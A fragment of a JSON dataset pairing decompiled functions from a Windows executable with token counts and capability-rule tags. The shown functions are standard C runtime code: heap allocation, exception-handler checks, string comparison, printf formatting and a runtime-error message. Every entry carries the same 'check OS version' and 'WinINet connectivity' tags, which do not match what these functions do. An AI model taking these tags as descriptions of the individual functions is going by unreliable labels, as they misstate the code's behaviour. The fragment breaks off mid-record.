        "decompiled_code": "\nint32_t * __cdecl fcn.0041fb02(uint32_t *arg_8h)\n\n{\n    int32_t *piVar1;\n    char *pcVar2;\n    int32_t *piVar3;\n    char cVar4;\n    int32_t *piVar5;\n    uint uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    uint32_t *puVar10;\n    int32_t iVar11;\n    uint32_t uVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint32_t uVar16;\n    int32_t iVar17;\n    bool bVar18;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    uVar8 = arg_8h + 0x17U & 0xfffffff0;\n    iVar9 = (arg_8h + 0x17U >> 4) + -1;\n    puVar10 = *0x44aca8 + *0x44aca4 * 5;\n    uVar7 = iVar9;\n    if (iVar9 < 0x20) {\n        uVar16 = 0xffffffff >> (uVar7 & 0x1f);\n        var_8h = 0xffffffff;\n    }\n    else {\n        uVar16 = 0;\n        var_8h = 0xffffffff >> (uVar7 - 0x20 & 0x1f);\n    }\n    bVar18 = *0x44acb0 < puVar10;\n    arg_8h = *0x44acb0;\n    while ((bVar18 && ((arg_8h[1] & var_8h | *arg_8h & uVar16) == 0))) {\n        arg_8h = arg_8h + 5;\n        bVar18 = arg_8h < puVar10;\n    }\n    puVar14 = *0x44aca8;\n    if (arg_8h == puVar10) {\n        for (; (puVar14 < *0x44acb0 && ((puVar14[1] & var_8h | *puVar14 & uVar16) == 0)); puVar14 = puVar14 + 5) {\n        }\n        arg_8h = puVar14;\n        if (puVar14 == *0x44acb0) {\n            for (; (puVar14 < puVar10 && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {\n            }\n            puVar15 = *0x44aca8;\n            arg_8h = puVar14;\n            if (puVar14 == puVar10) {\n                for (; (puVar15 < *0x44acb0 && (puVar15[2] == 0)); puVar15 = puVar15 + 5) {\n                }\n                arg_8h = puVar15;\n                if ((puVar15 == *0x44acb0) && (arg_8h = fcn.0041f666(),  arg_8h == NULL)) {\n                    return NULL;\n                }\n            }\n            uVar6 = fcn.0041f71d(arg_8h);\n            *arg_8h[4] = uVar6;\n            if (*arg_8h[4] == -1) {\n                return NULL;\n            }\n        }\n    }\n    piVar5 = arg_8h[4];\n    var_4h = *piVar5;\n    if ((var_4h == -1) || ((piVar5[var_4h + 0x31] & var_8h | piVar5[var_4h + 0x11] & uVar16) == 0)) {\n        var_4h = 0;\n        puVar10 = piVar5 + 0x11;\n        uVar12 = piVar5[0x31] & var_8h | *puVar10 & uVar16;\n        while (uVar12 == 0) {\n            puVar14 = puVar10 + 0x21;\n            var_4h = var_4h + 1;\n            puVar10 = puVar10 + 1;\n            uVar12 = *puVar14 & var_8h | *puVar10 & uVar16;\n        }\n    }\n    piVar3 = piVar5 + var_4h * 0x81 + 0x51;\n    iVar9 = 0;\n    uVar16 = piVar5[var_4h + 0x11] & uVar16;\n    if (uVar16 == 0) {\n        uVar16 = piVar5[var_4h + 0x31] & var_8h;\n        iVar9 = 0x20;\n    }\n    for (; -1 < uVar16; uVar16 = uVar16 << 1) {\n        iVar9 = iVar9 + 1;\n    }\n    piVar13 = piVar3[iVar9 * 2 + 1];\n    iVar11 = *piVar13 - uVar8;\n    iVar17 = (iVar11 >> 4) + -1;\n    if (0x3f < iVar17) {\n        iVar17 = 0x3f;\n    }\n    *0x44acb0 = arg_8h;\n    if (iVar17 != iVar9) {\n        if (piVar13[1] == piVar13[2]) {\n            if (iVar9 < 0x20) {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 & 0x1f));\n                piVar5[var_4h + 0x11] = uVar16 & piVar5[var_4h + 0x11];\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    *arg_8h = *arg_8h & uVar16;\n                }\n            }\n            else {\n                pcVar2 = piVar5 + iVar9 + 4;\n                uVar16 = ~(0x80000000U >> (iVar9 - 0x20 & 0x1f));\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] & uVar16;\n                *pcVar2 = *pcVar2 + -1;\n                if (*pcVar2 == '\\0') {\n                    arg_8h[1] = arg_8h[1] & uVar16;\n                }\n            }\n        }\n        *(piVar13[2] + 4) = piVar13[1];\n        *(piVar13[1] + 8) = piVar13[2];\n        if (iVar11 == 0) goto code_r0x0041fdbb;\n        piVar1 = piVar3 + iVar17 * 2;\n        iVar9 = piVar1[1];\n        piVar13[2] = piVar1;\n        piVar13[1] = iVar9;\n        piVar1[1] = piVar13;\n        *(piVar13[1] + 8) = piVar13;\n        if (piVar13[1] == piVar13[2]) {\n            cVar4 = *(iVar17 + 4 + piVar5);\n            *(iVar17 + 4 + piVar5) = cVar4 + '\\x01';\n            uVar7 = iVar17;\n            if (iVar17 < 0x20) {\n                if (cVar4 == '\\0') {\n                    *arg_8h = *arg_8h | 0x80000000U >> (uVar7 & 0x1f);\n                }\n                piVar5[var_4h + 0x11] = piVar5[var_4h + 0x11] | 0x80000000U >> (uVar7 & 0x1f);\n            }\n            else {\n                if (cVar4 == '\\0') {\n                    arg_8h[1] = arg_8h[1] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n                }\n                piVar5[var_4h + 0x31] = piVar5[var_4h + 0x31] | 0x80000000U >> (uVar7 - 0x20 & 0x1f);\n            }\n        }\n    }\n    if (iVar11 != 0) {\n        *piVar13 = iVar11;\n        *(iVar11 + -4 + piVar13) = iVar11;\n    }\ncode_r0x0041fdbb:\n    piVar13 = piVar13 + iVar11;\n    *piVar13 = uVar8 + 1;\n    *(piVar13 + (uVar8 - 4)) = uVar8 + 1;\n    iVar9 = *piVar3;\n    *piVar3 = iVar9 + 1;\n    if (((iVar9 == 0) && (arg_8h == *0x44aca0)) && (var_4h == *0x44acb8)) {\n        *0x44aca0 = NULL;\n    }\n    *piVar5 = var_4h;\n    return piVar13 + 1;\n}\n",
        "token_count": 2099
    },
    "0041fe19": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041fe19(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint32_t *puVar4;\n    uint32_t *puVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t in_FS_OFFSET;\n    uint lpBuffer;\n    int16_t *var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint32_t *var_4h;\n    \n    puVar4 = arg_8h;\n    pcVar3 = _sym.imp.KERNEL32.dll_InterlockedExchange;\n    puVar8 = arg_8h[2];\n    if ((puVar8 & 3) != 0) {\n        return 0;\n    }\n    var_4h = *(*(in_FS_OFFSET + 0x18) + 8);\n    if ((var_4h <= puVar8) && (puVar8 < *(*(in_FS_OFFSET + 0x18) + 4))) {\n        return 0;\n    }\n    puVar1 = arg_8h + 3;\n    if (*puVar1 == 0xffffffff) {\n        return 1;\n    }\n    uVar10 = 0;\n    arg_8h = NULL;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 != 0xffffffff) && (uVar10 <= *puVar5)) {\n            return 0;\n        }\n        if (puVar5[1] != 0) {\n            arg_8h = arg_8h + 1;\n        }\n        uVar10 = uVar10 + 1;\n        puVar5 = puVar5 + 3;\n    } while (uVar10 <= *puVar1);\n    if ((arg_8h != NULL) && ((puVar1 = puVar4[-2],  puVar1 < var_4h || (puVar4 <= puVar1)))) {\n        return 0;\n    }\n    uVar10 = puVar8 & 0xfffff000;\n    iVar12 = 0;\n    if (0 < *0x4497f8) {\n        do {\n            if (*(iVar12 * 4 + 0x449800) == uVar10) {\n                if (iVar12 < 1) {\n                    return 1;\n                }\n                iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x449840, 1);\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                if (*(iVar12 * 4 + 0x449800) == uVar10) goto code_r0x00420014;\n                iVar12 = *0x4497f8 + -1;\n                if (iVar12 < 0) goto code_r0x00420002;\n                goto code_r0x0041fff2;\n            }\n            iVar12 = iVar12 + 1;\n        } while (iVar12 < *0x4497f8);\n    }\n    iVar12 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(puVar8, &lpBuffer, 0x1c);\n    if (iVar12 == 0) {\n        return 0xffffffff;\n    }\n    if (var_8h != 0x1000000) {\n        return 0xffffffff;\n    }\n    if ((var_ch & 0xcc) != 0) {\n        if (((*var_1ch != 0x5a4d) || (piVar6 = *(var_1ch + 0x1e) + var_1ch,  *piVar6 != 0x4550)) ||\n           (*(piVar6 + 6) != 0x10b)) {\n            return 0xffffffff;\n        }\n        uVar9 = *(piVar6 + 5);\n        if (*(piVar6 + 6) == 0) {\n            return 0xffffffff;\n        }\n        uVar2 = *(piVar6 + uVar9 + 0x24);\n        if (((uVar2 <= puVar8 - var_1ch) && (puVar8 - var_1ch < *(piVar6 + uVar9 + 0x20) + uVar2)) &&\n           ((*(piVar6 + uVar9 + 0x3f) & 0x80) != 0)) {\n            return 0;\n        }\n    }\n    iVar7 = (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x449840, 1);\n    iVar12 = *0x4497f8;\n    if (iVar7 != 0) {\n        return 1;\n    }\n    iVar7 = *0x4497f8;\n    if (0 < *0x4497f8) {\n        puVar8 = *0x4497f8 * 4 + 0x4497fc;\n        do {\n            if (*puVar8 == uVar10) break;\n            iVar7 = iVar7 + -1;\n            puVar8 = puVar8 + -1;\n        } while (0 < iVar7);\n    }\n    if (iVar7 == 0) {\n        iVar7 = 0xf;\n        if (*0x4497f8 < 0x10) {\n            iVar7 = *0x4497f8;\n        }\n        iVar11 = 0;\n        if (-1 < iVar7) {\n            do {\n                puVar8 = iVar11 * 4 + 0x449800;\n                uVar9 = *puVar8;\n                iVar11 = iVar11 + 1;\n                *puVar8 = uVar10;\n                uVar10 = uVar9;\n            } while (iVar11 <= iVar7);\n        }\n        if (iVar12 < 0x10) {\n            *0x4497f8 = iVar12 + 1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x449840, 0);\n    return 1;\n    while (iVar12 = iVar12 + -1,  -1 < iVar12) {\ncode_r0x0041fff2:\n        if (*(iVar12 * 4 + 0x449800) == uVar10) break;\n    }\n    if (iVar12 < 0) {\ncode_r0x00420002:\n        if (*0x4497f8 < 0x10) {\n            *0x4497f8 = *0x4497f8 + 1;\n        }\n        iVar12 = *0x4497f8 + -1;\n    }\n    else if (iVar12 == 0) goto code_r0x0042002c;\ncode_r0x00420014:\n    iVar7 = 0;\n    if (-1 < iVar12) {\n        do {\n            puVar8 = iVar7 * 4 + 0x449800;\n            uVar9 = *puVar8;\n            iVar7 = iVar7 + 1;\n            *puVar8 = uVar10;\n            uVar10 = uVar9;\n        } while (iVar7 <= iVar12);\n    }\ncode_r0x0042002c:\n    (*pcVar3)(0x449840, 0);\n    return 1;\n}\n",
        "token_count": 1642
    },
    "00420042": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00420042(uint8_t *arg_8h, uint8_t *arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar1 = fcn.0041e005();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x4447cc) {\n        iVar1 = fcn.00422e0c();\n    }\n    if (arg_10h == 0) {\n        iVar2 = 0;\n    }\n    else if (*(iVar1 + 0x14) == 0) {\n        iVar2 = fcn.00423e40(arg_8h, arg_ch, arg_10h);\n    }\n    else {\n        do {\n            iVar2 = fcn.00423d4f(iVar1, *arg_8h);\n            arg_8h = arg_8h + 1;\n            iVar3 = fcn.00423d4f(iVar1, *arg_ch);\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n            if ((arg_10h == 0) || (iVar2 == 0)) break;\n        } while (iVar2 == iVar3);\n        iVar2 = iVar2 - iVar3;\n    }\n    return iVar2;\n}\n",
        "token_count": 317
    },
    "00420231": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00420231(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t unaff_EDI;\n    \n    if (((*(unaff_EDI + 0xc) & 0x40) == 0) || (*(unaff_EDI + 8) != 0)) {\n        do {\n            if (param_1 < 1) {\n                return;\n            }\n            param_1 = param_1 + -1;\n            fcn.004201da();\n        } while (*in_EAX != -1);\n    }\n    else {\n        *in_EAX = *in_EAX + param_1;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00420268": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00420268(uint param_1, uint8_t *param_2, int32_t **param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t extraout_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    char *arg_ch;\n    bool bVar11;\n    int64_t iVar12;\n    int32_t *piStack600;\n    int32_t *piStack596;\n    int32_t iStack588;\n    int32_t iStack584;\n    uint uStack580;\n    int32_t iStack576;\n    int32_t iStack572;\n    int32_t *piStack568;\n    int32_t iStack564;\n    int32_t *piStack560;\n    int32_t iStack556;\n    uchar uStack552;\n    char cStack551;\n    int32_t iStack548;\n    int32_t iStack544;\n    int32_t *piStack540;\n    int32_t *piStack536;\n    uint32_t uStack532;\n    int32_t aiStack528 [127];\n    uint uStack17;\n    uint uStack8;\n    \n    uStack8 = *0x444220;\n    iStack544 = 0;\n    iStack548 = 0;\n    piStack568 = NULL;\n    uVar10 = *param_2;\n    iVar7 = 0;\n    puVar2 = param_2;\n    ppiVar3 = param_3;\n    do {\n        if ((uVar10 == 0) || (param_2 = puVar2 + 1,  iStack548 < 0)) {\n            fcn.0041c6de();\n            return;\n        }\n        if ((uVar10 < ' ') || ('x' < uVar10)) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = *(uVar10 + 0x43af68) & 0xf;\n        }\n        iStack584 = *(iVar7 + 0x43af88 + uVar5 * 8) >> 4;\n        param_3 = ppiVar3;\n    // switch table (8 cases) at 0x420a42\n        switch(iStack584) {\n        case 0:\ncode_r0x00420484:\n            iStack564 = 0;\n            if ((*(*0x444910 + 1 + uVar10 * 2) & 0x80) != 0) {\n                fcn.004201da();\n                param_2 = puVar2 + 2;\n            }\n            fcn.004201da();\n            break;\n        case 1:\n            piStack536 = 0xffffffff;\n            uStack580 = 0;\n            iStack572 = 0;\n            piStack560 = NULL;\n            iStack556 = 0;\n            uStack532 = 0;\n            iStack564 = 0;\n            break;\n        case 2:\n            if (uVar10 == 0x20) {\n                uStack532 = uStack532 | 2;\n            }\n            else if (uVar10 == 0x23) {\n                uStack532 = uStack532 | 0x80;\n            }\n            else if (uVar10 == 0x2b) {\n                uStack532 = uStack532 | 1;\n            }\n            else if (uVar10 == 0x2d) {\n                uStack532 = uStack532 | 4;\n            }\n            else if (uVar10 == 0x30) {\n                uStack532 = uStack532 | 8;\n            }\n            break;\n        case 3:\n            if (uVar10 == 0x2a) {\n                piStack560 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack560 < 0) {\n                    uStack532 = uStack532 | 4;\n                    piStack560 = -piStack560;\n                }\n            }\n            else {\n                piStack560 = uVar10 + -0x30 + piStack560 * 10;\n            }\n            break;\n        case 4:\n            piStack536 = NULL;\n            break;\n        case 5:\n            if (uVar10 == 0x2a) {\n                piStack536 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack536 < 0) {\n                    piStack536 = 0xffffffff;\n                }\n            }\n            else {\n                piStack536 = uVar10 + -0x30 + piStack536 * 10;\n            }\n            break;\n        case 6:\n            if (uVar10 == 0x49) {\n                uVar1 = *param_2;\n                if ((uVar1 == 0x36) && (puVar2[2] == 0x34)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 | 0x8000;\n                }\n                else if ((uVar1 == 0x33) && (puVar2[2] == 0x32)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 & 0xffff7fff;\n                }\n                else if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                         ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                    iStack584 = 0;\n                    goto code_r0x00420484;\n                }\n            }\n            else if (uVar10 == 0x68) {\n                uStack532 = uStack532 | 0x20;\n            }\n            else if (uVar10 == 0x6c) {\n                uStack532 = uStack532 | 0x10;\n            }\n            else if (uVar10 == 0x77) {\n                uStack532 = uStack532 | 0x800;\n            }\n            break;\n        case 7:\n            if (uVar10 < 'h') {\n                if (uVar10 < 'e') {\n                    if (uVar10 < 'Y') {\n                        if (uVar10 != 0x58) {\n                            if (uVar10 == 0x43) {\n                                if ((uStack532 & 0x830) == 0) {\n                                    uStack532 = uStack532 | 0x800;\n                                }\n                                goto code_r0x0042058d;\n                            }\n                            if ((uVar10 != 0x45) && (uVar10 != 0x47)) {\n                                if (uVar10 == 0x53) {\n                                    if ((uStack532 & 0x830) == 0) {\n                                        uStack532 = uStack532 | 0x800;\n                                    }\n                                    goto code_r0x00420510;\n                                }\n                                goto code_r0x00420905;\n                            }\n                            uStack580 = 1;\n                            uVar10 = uVar10 + 0x20;\n                            goto code_r0x00420561;\n                        }\ncode_r0x004207ab:\n                        iStack576 = 7;\ncode_r0x004207ae:\n                        iStack544 = 0x10;\n                        if ((uStack532 & 0x80) != 0) {\n                            cStack551 = iStack576 + 'Q';\n                            uStack552 = 0x30;\n                            iStack556 = 2;\n                        }\n                        goto code_r0x004205de;\n                    }\n                    if (uVar10 == 0x5a) {\n                        param_3 = ppiVar3 + 1;\n                        piVar8 = *ppiVar3;\n                        piVar6 = *0x4445f4;\n                        piVar4 = *0x4445f4;\n                        if ((piVar8 == NULL) || (piStack540 = piVar8[1],  piVar4 = *0x4445f4,  piStack540 == NULL))\n                        goto code_r0x0042071f;\n                        iStack544 = *piVar8;\n                        if ((uStack532 & 0x800) == 0) {\n                            iStack564 = 0;\n                        }\n                        else {\n                            iStack544 = iStack544 / 2;\n                            iStack564 = 1;\n                        }\n                    }\n                    else if (uVar10 == 99) {\ncode_r0x0042058d:\n                        if ((uStack532 & 0x810) == 0) {\n                            aiStack528[0]._0_1_ = *ppiVar3;\n                            iStack544 = 1;\n                        }\n                        else {\n                            iStack544 = fcn.00424468(aiStack528, *ppiVar3);\n                            if (iStack544 < 0) {\n                                iStack572 = 1;\n                            }\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = aiStack528;\n                    }\n                    else if (uVar10 == 100) goto code_r0x004205d3;\n                }\n                else {\ncode_r0x00420561:\n                    uStack532 = uStack532 | 0x40;\n                    piVar8 = aiStack528;\n                    piVar6 = aiStack528;\n                    if (piStack536 < 0) {\n                        piStack536 = 0x6;\n                    }\n                    else if (piStack536 == NULL) {\n                        if (uVar10 == 0x67) {\n                            piStack536 = 0x1;\n                        }\n                    }\n                    else {\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                        if ((0xa3 < piStack536) &&\n                           (piStack540 = aiStack528,  piStack568 = fcn.0041ba5b(piStack536 + 0x15d), \n                           piVar8 = piStack568,  piVar6 = piStack568,  piStack568 == NULL)) {\n                            piStack536 = 0xa3;\n                            piVar8 = aiStack528;\n                            piVar6 = piStack540;\n                        }\n                    }\n                    piStack540 = piVar6;\n                    piStack600 = *ppiVar3;\n                    param_3 = ppiVar3 + 2;\n                    piStack596 = ppiVar3[1];\n                    (**0x444750)(&piStack600, piVar8, uVar10, piStack536, uStack580);\n                    uVar5 = uStack532 & 0x80;\n                    if ((uVar5 != 0) && (piStack536 == NULL)) {\n                        (**0x44475c)(piVar8);\n                    }\n                    if ((uVar10 == 0x67) && (uVar5 == 0)) {\n                        (**0x444754)(piVar8);\n                    }\n                    piVar6 = piVar8;\n                    piVar4 = piStack540;\n                    if (*piVar8 == '-') {\n                        uStack532 = uStack532 | 0x100;\n                        piVar6 = piVar8 + 1;\n                        piVar4 = piVar8 + 1;\n                    }\ncode_r0x0042071f:\n                    piStack540 = piVar4;\n                    iStack544 = fcn.0041c6f0(piVar6);\n                }\ncode_r0x00420905:\n                uVar5 = uStack532;\n                if (iStack572 == 0) {\n                    if ((uStack532 & 0x40) != 0) {\n                        if ((uStack532 & 0x100) == 0) {\n                            if ((uStack532 & 1) == 0) {\n                                if ((uStack532 & 2) == 0) goto code_r0x0042093d;\n                                uStack552 = 0x20;\n                            }\n                            else {\n                                uStack552 = 0x2b;\n                            }\n                        }\n                        else {\n                            uStack552 = 0x2d;\n                        }\n                        iStack556 = 1;\n                    }\ncode_r0x0042093d:\n                    arg_ch = piStack560 + (-iStack544 - iStack556);\n                    if ((uStack532 & 0xc) == 0) {\n                        fcn.0042020d(0x20, arg_ch, param_1);\n                    }\n                    fcn.00420231(iStack556);\n                    if (((uVar5 & 8) != 0) && ((uVar5 & 4) == 0)) {\n                        fcn.0042020d(0x30, arg_ch, param_1);\n                    }\n                    if ((iStack564 == 0) || (iStack544 < 1)) {\n                        fcn.00420231(iStack544);\n                    }\n                    else {\n                        iStack588 = iStack544;\n                        piVar8 = piStack540;\n                        do {\n                            iStack588 = iStack588 + -1;\n                            iVar7 = fcn.00424468(&uStack17 + 1, *piVar8);\n                            piVar8 = piVar8 + 2;\n                            if (iVar7 < 1) break;\n                            fcn.00420231(iVar7);\n                        } while (iStack588 != 0);\n                    }\n                    if ((uStack532 & 4) != 0) {\n                        fcn.0042020d(0x20, arg_ch, param_1);\n                    }\n                }\n            }\n            else {\n                if (uVar10 == 0x69) {\ncode_r0x004205d3:\n                    uStack532 = uStack532 | 0x40;\ncode_r0x004205d7:\n                    iStack544 = 10;\ncode_r0x004205de:\n                    if ((uStack532 & 0x8000) == 0) {\n                        param_3 = ppiVar3 + 1;\n                        if ((uStack532 & 0x20) == 0) {\n                            piVar8 = *ppiVar3;\n                            if ((uStack532 & 0x40) == 0) {\n                                piVar6 = NULL;\n                                goto code_r0x0042084f;\n                            }\n                        }\n                        else if ((uStack532 & 0x40) == 0) {\n                            piVar8 = *ppiVar3;\n                        }\n                        else {\n                            piVar8 = *ppiVar3;\n                        }\n                        piVar6 = piVar8 >> 0x1f;\n                    }\n                    else {\n                        piVar8 = *ppiVar3;\n                        piVar6 = ppiVar3[1];\n                        param_3 = ppiVar3 + 2;\n                    }\ncode_r0x0042084f:\n                    if ((((uStack532 & 0x40) != 0) && (piVar6 < 1)) && (piVar6 < 0)) {\n                        bVar11 = piVar8 != NULL;\n                        piVar8 = -piVar8;\n                        piVar6 = -(piVar6 + bVar11);\n                        uStack532 = uStack532 | 0x100;\n                    }\n                    if ((uStack532 & 0x8000) == 0) {\n                        piVar6 = NULL;\n                    }\n                    iVar12 = CONCAT44(piVar6, piVar8);\n                    if (piStack536 < 0) {\n                        piStack536 = 0x1;\n                    }\n                    else {\n                        uStack532 = uStack532 & 0xfffffff7;\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                    }\n                    if ((piVar8 | piVar6) == 0) {\n                        iStack556 = 0;\n                    }\n                    piVar8 = &uStack17;\n                    while( true ) {\n                        iVar7 = iVar12;\n                        piVar6 = piStack536 + -1;\n                        if ((piStack536 < 1) && (iVar12 == 0)) break;\n                        piStack536 = piVar6;\n                        iVar12 = fcn.00422fd0();\n                        iVar9 = extraout_ECX + 0x30;\n                        if (0x39 < iVar9) {\n                            iVar9 = iVar9 + iStack576;\n                        }\n                        *piVar8 = iVar9;\n                        piVar8 = piVar8 + -1;\n                        iStack588 = iVar7;\n                    }\n                    iStack544 = &uStack17 + -piVar8;\n                    piStack540 = piVar8 + 1;\n                    piStack536 = piVar6;\n                    if (((uStack532 & 0x200) != 0) && ((*piStack540 != '0' || (iStack544 == 0)))) {\n                        *piVar8 = '0';\n                        iStack544 = &uStack17 + -piVar8 + 1;\n                        piStack540 = piVar8;\n                    }\n                    goto code_r0x00420905;\n                }\n                if (uVar10 != 0x6e) {\n                    if (uVar10 == 0x6f) {\n                        iStack544 = 8;\n                        if ((uStack532 & 0x80) != 0) {\n                            uStack532 = uStack532 | 0x200;\n                        }\n                        goto code_r0x004205de;\n                    }\n                    if (uVar10 == 0x70) {\n                        piStack536 = 0x8;\n                        goto code_r0x004207ab;\n                    }\n                    if (uVar10 == 0x73) {\ncode_r0x00420510:\n                        piVar8 = piStack536;\n                        if (piStack536 == 0xffffffff) {\n                            piVar8 = 0x7fffffff;\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = *ppiVar3;\n                        if ((uStack532 & 0x810) == 0) {\n                            piVar6 = piStack540;\n                            if (piStack540 == NULL) {\n                                piVar6 = *0x4445f4;\n                                piStack540 = *0x4445f4;\n                            }\n                            for (; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != '\\0')); piVar6 = piVar6 + 1) {\n                            }\n                            iStack544 = piVar6 - piStack540;\n                        }\n                        else {\n                            if (piStack540 == NULL) {\n                                piStack540 = *0x4445f8;\n                            }\n                            iStack564 = 1;\n                            for (piVar6 = piStack540; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != 0));\n                                piVar6 = piVar6 + 2) {\n                            }\n                            iStack544 = piVar6 - piStack540 >> 1;\n                        }\n                        goto code_r0x00420905;\n                    }\n                    if (uVar10 != 0x75) {\n                        if (uVar10 != 0x78) goto code_r0x00420905;\n                        iStack576 = 0x27;\n                        goto code_r0x004207ae;\n                    }\n                    goto code_r0x004205d7;\n                }\n                param_3 = ppiVar3 + 1;\n                if ((uStack532 & 0x20) == 0) {\n                    **ppiVar3 = iStack548;\n                }\n                else {\n                    **ppiVar3 = iStack548;\n                }\n                iStack572 = 1;\n            }\n            if (piStack568 != NULL) {\n                fcn.0041ba6d(piStack568);\n                piStack568 = NULL;\n            }\n        }\n        uVar10 = *param_2;\n        iVar7 = iStack584;\n        puVar2 = param_2;\n        ppiVar3 = param_3;\n    } while( true );\n}\n",
        "token_count": 4442
    },
    "00420bc8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00420bc8(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uStack296;\n    uchar *puStack292;\n    uint uStack288;\n    uchar auStack272 [260];\n    uchar uStack12;\n    uint uStack8;\n    \n    uStack8 = *0x444220;\n    uVar1 = 0;\n    do {\n        if (param_1 == *(uVar1 * 8 + 0x444600)) break;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x13);\n    if (param_1 == *(uVar1 * 8 + 0x444600)) {\n        if ((*0x449630 == 1) || ((*0x449630 == 0 && (*0x444210 == 1)))) {\n            uStack288 = 0;\n            puStack292 = &stack0x00000004;\n            uStack296 = *(uVar1 * 8 + 0x444604);\n            uStack296 = fcn.0041c6f0();\n            (*_sym.imp.KERNEL32.dll_GetStdHandle)();\n            (*_sym.imp.KERNEL32.dll_WriteFile)();\n        }\n        else if (param_1 != 0xfc) {\n            uStack288 = 0x104;\n            puStack292 = &stack0xfffffef0;\n            uStack296 = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n            if (iVar2 == 0) {\n                fcn.00420ad0();\n            }\n            iVar2 = fcn.0041c6f0();\n            if (0x3c < iVar2 + 1U) {\n                fcn.0041c6f0();\n                fcn.00424590();\n            }\n            fcn.0041c6f0();\n            fcn.0041c6f0();\n            fcn.0041bcd0();\n            fcn.00420ad0();\n            fcn.00420ae0();\n            fcn.00420ae0();\n            fcn.00420ae0();\n            fcn.0042448f(&stack0xfffffed8, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n        }\n    }\n    uStack288 = 0x420d34;\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 543
    },
    "00420d78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
